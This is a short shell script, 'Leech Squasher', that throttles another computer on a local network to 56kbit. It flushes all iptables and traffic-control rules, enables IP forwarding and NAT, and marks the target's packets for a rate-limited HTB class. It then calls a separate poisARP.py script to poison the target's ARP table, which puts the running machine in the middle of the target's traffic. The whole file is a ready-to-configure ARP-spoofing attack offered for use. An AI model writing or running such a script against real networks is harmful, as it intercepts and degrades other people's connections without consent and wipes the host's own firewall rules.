#!/bin/sh
# Leech Squasher
#
# To test whether or not bandwidth is being limited,
# run Speakeasy's bandwidth speed test on the 'leech' machine.
# http://www.speakeasy.net/speedtest/
#

###
# *** CONFIGURE! ***
###
iface=""
iface_speed="100mbit"
router_ip=""
leech_speed="56kbit"
leech_ip=""

###
# Commands
###
echo "[+] Clearing settings."
iptables --flush
iptables -t mangle --flush
iptables -t nat --flush
tc qdisc del dev $iface root

echo "[+] Setting up iptables."
echo 1 > /proc/sys/net/ipv4/ip_forward
echo 0 > /proc/sys/net/ipv4/conf/eth0/send_redirects
iptables -t nat -A POSTROUTING -o $iface -j MASQUERADE
iptables -A FORWARD -i $iface -j ACCEPT
iptables -t mangle -A FORWARD -i eth0 -s $leech_ip -j MARK --set-mark 1337
iptables -t mangle -A FORWARD -i eth0 -d $leech_ip -j MARK --set-mark 1337

echo "[+] Setting up HTB."
tc qdisc add dev $iface parent root handle 1: htb default 10
tc class add dev $iface parent 1: classid 1:10 htb rate $iface_speed prio 0
tc class add dev $iface parent 1: classid 1:11 htb rate $leech_speed prio 1
tc filter add dev $iface protocol ip parent 1:0 handle 1337 fw flowid 1:11


###
# Poison the leech's ARP table
###
echo "[+] Poisoning ARP table.  Press ctrl-c to stop."
./poisARP.py $router_ip $leech_ip 
